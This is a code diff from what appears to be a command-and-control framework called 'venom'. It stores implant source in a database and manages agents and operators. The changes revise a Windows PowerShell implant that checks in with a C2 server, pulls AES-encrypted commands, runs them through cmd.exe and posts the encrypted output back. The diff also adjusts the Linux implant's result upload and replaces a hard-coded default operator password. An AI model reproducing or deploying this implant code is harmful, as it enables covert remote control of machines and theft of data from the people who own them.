@@ -8,10 +8,11 @@ db = client.C2
 To-Do: 
 1- Handle bad requested tasks (bad commands) (Done)
 2- Delete the task after writing its result (Done) 
-3- Check how os.popen supports stderr return
+3- Check how subprocess.Popen supports stderr return (Done)
+4- Variable Interval timeout
 '''
 
-def registerAgent(agentID, type, bindListenerID, ip, port, timeout = 60):
+def registerAgent(agentID, type, bindListenerID, port, timeout = 60):
 
     agent = {'id': agentID, 
              'port': port,
@@ -20,7 +21,7 @@ def registerAgent(agentID, type, bindListenerID, ip, port, timeout = 60):
              'task': '',
              'taskResult': '',
              'bindListenerID': bindListenerID,
-             'serverIP': ip, 
+             'ip': '', 
              'timeout': timeout
              }
 
@@ -148,6 +149,13 @@ def login(email, password):
     else: 
         return False    
 
+def register(email, password): 
+    db.operators.insert_one({ 
+            'email': email, 
+            'password': sha256(password.encode('utf-8')).hexdigest()
+        }) 
+
+
 def getImplant(type): 
     return db.implants.find_one({'type': {'$eq' : type }}).get('implant')
 
@@ -223,7 +231,7 @@ if __name__ == "__main__":
                 result = "Task completed but has no output"
             result = encrypt(result)
             
-            r.post(url= _C2_ + '/task/results/{}'.format(_ID_), data = result.encode('ascii')) 
+            r.post(url= _C2_ + '/task/results/{}'.format(_ID_), data = result.encode('utf-8')) 
          
         else: 
             continue'''
@@ -256,21 +264,25 @@ implant_windows = '''function Create-AesManagedObject($key, $IV) {
 }
 
 function Encrypt-String($key, $unencryptedString) {
+	
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
     $aesManaged = Create-AesManagedObject $key
     $encryptor = $aesManaged.CreateEncryptor()
-    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    $bytess = $bytes.length
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytess);
     [byte[]] $fullData = $aesManaged.IV + $encryptedData
     $aesManaged.Dispose()
     [System.Convert]::ToBase64String($fullData)
 }
 
 function Decrypt-String($key, $encryptedStringWithIV) {
+    
     $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
     $IV = $bytes[0..15]
     $aesManaged = Create-AesManagedObject $key $IV
     $decryptor = $aesManaged.CreateDecryptor();
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
+    $bytess = $bytes.Length - 16;
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytess);
     $aesManaged.Dispose()
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
     
@@ -285,6 +297,7 @@ function Convert-ASCII($ascii) {
 	Return $final
 }
 
+
 $ip = "REPLACE_IP"
 $port = "REPLACE_PORT"
 $id = "REPLACE_ID"
@@ -292,7 +305,6 @@ $key = "REPLACE_KEY"
 $reguri = ("http" + ':' + "//$ip" + ':' + "$port/reg/$id")
 $name = (Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'GET').Content
 $name=Convert-ASCII($name)
-$name
 if ($name -eq "Success"){
 $taskuri = ("http" + ':' + "//$ip" + ':' + "$port/task/$id")
 $responseuri = ("http" + ':' + "//$ip" + ':' + "$port/task/results/$id")
@@ -300,25 +312,26 @@ for (;;) {
 $n  = Get-Random -Maximum 20
 $task = (Invoke-WebRequest -UseBasicParsing -Uri $taskuri  -Method 'GET').Content
 $task=Convert-ASCII($task)
-if ($task -ne "0") {
 
+if ($task -ne "") {
 $dtask = Decrypt-String $key $task
 $res = cmd.exe /c $dtask
 $data = Encrypt-String $key $res
-$data = "$data"
-$response = (Invoke-WebRequest -UseBasicParsing -Uri $responseuri -body $data -Method 'POST').Content
+$response = (Invoke-WebRequest -UseBasicParsing -Uri $responseuri -body $data -ContentType "text/plain; charset=utf-8" -Method 'POST').Content
     }
 sleep $n
 } }'''
 
-def migrate(): 
+def migrate(password): 
     db.listeners.delete_many({}) 
     db.agents.delete_many({})
-    if not db.operators.find_one({'email': {'$eq': 'venom@venom.local'}, 'password': {'$eq': sha256('venom1234'.encode('utf-8')).hexdigest()}}): 
-        print("Creating a default password! 😍 ... Make sure to change it\nUsername: venom \nPassword: venom1234")
-        db.operators.insert_one({ 
+    try: 
+        db.operators.delete_one({'email': {'$eq': 'venom@venom.local'}}) 
+    except: 
+        pass    
+    db.operators.insert_one({ 
             'email': 'venom@venom.local', 
-            'password': sha256('venom1234'.encode('utf-8')).hexdigest()
+            'password': sha256(password.encode('utf-8')).hexdigest()
         }) 
     if not db.implants.find_one({'type': 'Linux' }):
         db.implants.insert_one({'implant': implant_linux, 'type': 'Linux'}) 
